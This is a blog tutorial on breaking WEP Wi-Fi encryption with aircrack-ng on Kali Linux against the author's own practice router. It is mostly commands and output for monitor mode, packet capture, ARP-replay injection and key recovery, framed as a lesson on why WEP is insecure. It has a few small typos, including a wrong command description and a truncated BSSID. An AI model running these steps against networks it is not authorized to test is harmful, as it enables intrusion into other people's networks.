---
layout:     post
title:      "Wireless Security"
subtitle:   "WEP Hacking"
date:       2016-09-25 2:00:00
author:     "W3ndige"
header-img: "img/wireless-security-wep-header.jpg"
---

<h1>Introduction</h1>

<p>Wired Equivalent Privacy (WEP) was introduced in 1999 as a part of 802.11 standard. It's puprose was to assure the privacy of the wireless network in a way near to wired networks. It's using RC4 cipher (with different key size: 64 and 128 bits) and CRC-32 checksum to mantain integrity. In addition WEP is using a short, 24 bit initialization vector (IV), which is added to the key provided by user, creating 'unique' for each packet RC4 key. But because the IV is so short, and it's used with the same key, WEP is now considered outdated, easy to crack and insecure.  </p>

![wep-crypto](/img/wireless-security-wep/wep-crypto.png){:class="img-responsive"}


<h1>Step by step attack</h1>

<p>Firstly we need to setup an old router, with WEP security option enabled, which will be our practice target. Also remember to have some other device connected to it wirelessly since we'll need to capture encrypted data between them. After that check whether or not your wireless card supports packet injection - if not, you have to get another one. I'm using TL-WN722N which is great and cheap option. Now, if you have everything up and running - let's move to Kali. </p>

<p>Firstly let's check if your adapter is seen by Kali - you can do this by typing <b>airmon-ng</b> command. </p>

{% highlight bash %}
root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy0	wlan0		b43		Broadcom on bcma bus, information limited
phy1	wlan1		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
{% endhighlight %}

<p>For me it shows two cards - built in and USB one which is <b>wlan1</b></p>

<p>Now type <b>airmon-ng start [interface]</b> to set your USB adapter into monitor mode. If you encounter any problem try using <b>airmon-ng check kill</b> which will kill any processes using this adapter. After that I checked what name was assigned to the adapter - for me it was <b>wlan1mon</b> but yours can be different. </p>
{% highlight bash %}
root@kali:~# airmon-ng start wlan1


PHY	Interface	Driver		Chipset

phy0	wlan0		b43		Broadcom on bcma bus, information limited
phy1	wlan1		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n

		(mac80211 monitor mode vif enabled for [phy1]wlan1 on [phy1]wlan1mon)
		(mac80211 station mode vif disabled for [phy1]wlan1)

root@kali:~# ifconfig
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 0  (Local Loopback)
        RX packets 2200  bytes 150212 (146.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2200  bytes 150212 (146.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec F4-F2-6D-1A-99-ED-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000
{% endhighlight %}

<p>Next step is to find the router - and get it's BSSID, channel (CH) and ESSID. You can do this by running command <b>airodump-ng [interface]</b>. This will show list of routers in range, information we need and some additional data. </p>

{% highlight bash %}
root@kali:~# airodump-ng wlan1mon
BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 18:21:95:90:46:45  -86        2        0    0   1  54e. WPA2 CCMP   PSK  AndroidAP                                                                  
 54:B8:0A:10:DF:0E  -42       34        0    0   1  54e  WEP  WEP         pentest_wep                                                                
 D2:AE:EC:CE:DB:3B  -76       10        0    0   1  54e  WPA2 CCMP   PSK  DIRECT-mi pass-PHILIPS TV                                                  


 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                            

 00:27:22:2A:9C:0E  00:27:22:06:83:C3  -83    0 - 0     50       49                                                                                   
 C4:27:95:75:3E:45  10:30:47:E3:43:F5  -67    0 -11e     0        2  
{% endhighlight %}


<p>Here it is, we've got all information to start the attack. My target is <b>pentest_wep</b> with BSSID:<b>54:B8:0A:10:DF:0E</b> on channel <b>1</b>. Copy the essential information and open another terminal window (CTR + ALT + T). Now we're going to capture encrypted packets sent between the router and client device. We can do this with airodump-ng command. </p>

{% highlight bash %}
root@kali:~# airodump-ng -w pentest_wep -c 1 --bssid 54:B8:0A:10:DF:0 wlan1mon
{% endhighlight %}

<p>Explanation: <b>-w</b> will save the packets to the file called pentest_wep, <b>-c</b> is a channel that the target is using, and <b>--bssid</b> is to specify which router we're going to attack. Last thing is to choose the USB adapter running monitor mode.</p>

<p>That's what we're going to be shown after running this command. </p>

{% highlight bash %}
CH  1 ][ Elapsed: 32 s ][ 20016-09-25 10:16                                         

BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                    

54:B8:0A:10:DF:0E  218 100      312     1927  223   1  54 . WEP  WEP         pentest_wep              

BSSID              STATION            PWR   Rate   Lost  Packets  Probe                               

00:A0:37:C3:D1:CB  06:19:E0:88:6A:4C  170   0-24   1005       16    
{% endhighlight %}

<p>As you can see we've got a few more information - number of beacons, data sent, packets, and data per second. These numbers will start at 0 and grow as the traffic is passed between the router and client device. Then this traffic is saved into the file, specified in the command argument, which we're going to use later in order to crack the password. But to make it work you will need at least 20,000 IV's, sometimes even more. I recommend you to 'harvest' around 100,000 as it will undoubtedly work. At this point you can wait until you get desired number of IV's. But what if the target isn't using internet at the time? What if he/she's sleeping? Yup, there's solution to this ;)</p>


<p>Open up another terminal window (remember not to close the one running airodump-ng) and type in this command <b>aireplay-ng -1 0 -a [BSSID] [interface]</b></p>

{% highlight bash %}
root@kali:~# aireplay-ng -1 0 -a 54:B8:0A:10:DF:0E wlan1mon
No source MAC (-h) specified. Using the device MAC (F4:F2:6D:1A:99:ED)
08:05:38  Waiting for beacon frame (BSSID: 54:B8:0A:10:DF:0E) on channel 1

08:05:38  Sending Authentication Request (Open System) [ACK]
08:05:38  Authentication successful
08:05:38  Sending Association Request [ACK]
08:05:38  Association successful :-) (AID: 1)
{% endhighlight %}

<p>After that run another command <b>aireplay-ng -1 0 -a [BSSID] [interface]</b></p>

{% highlight bash %}
root@kali:~# aireplay-ng -3 -b 54:B8:0A:10:DF:0E wlan1mon
{% endhighlight %}

<p>Aireplay-ng works by sending ARP request packets so that data and beacons should start growing quickly. This works even if no one is connected to the internet. </p>


<p>Now after we've already captured huge amount of packets close all the processes that were running, then type <b>ls</b> to see if the .cap file was saved. Then we can type <b>aircrack-ng [filename.cap]</b>. This will start the process of cracking the password. Attack will be restarted between every 5000 IV's. </p>

{% highlight bash %}
root@kali:~# aircrack-ng pentest_wep-01.cap
Opening pentest_wep-01.cap
Read 1894984 packets.

   #  BSSID              ESSID                     Encryption

   1  54:B8:0A:10:DF:0E  pentest_wep               WEP (9651 IVs)

Choosing first network as target.

Opening pentest_wep-01.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 9651 ivs.


                                 Aircrack-ng 1.2 rc3


                 [00:32:05] Tested 1972 keys (got 24276 IVs)

   KB    depth   byte(vote)
    0    4/  8   42(30720) 30(29696) B0(29696) 68(29184) 0E(28160)
    1    0/  1   31(34304) 0A(30720) 0F(29952) 35(29952) E9(29952)
    2    2/  5   0F(29696) A1(29440) CA(29440) CB(28928) F7(28928)
    3    2/  6   68(30720) 15(30464) 89(29696) E1(29696) 5F(29184)
    4    8/  9   92(29696) 9C(28928) B5(28928) 64(28672) 8F(28672)

                     KEY FOUND! [ 42:31:57:68:92 ]
	Decrypted correctly: 100%
{% endhighlight %}

<p>And we've got the key! Some versions of aircrack may show you also ASCII version of the key but both can be used to login into the wireless network. Notice that you can run aircrack at the same time as running airodump - that way it tries to crack the key every time you gather new 5000 IV's. </p>

<p>Notice how easy it was to gain access to the network protected with WEP? That's why you should never protect your network with this standard. </p>

<p>As always thanks for reading, keep tuned for the next part about more advanced algorithms like WPA or WPA2. I also really recommend trying it out by yourself as it's the best way to understand how it works and learning by practicing is the best way to gain knowledge. </p>

<p>~ Stay safe! </p>
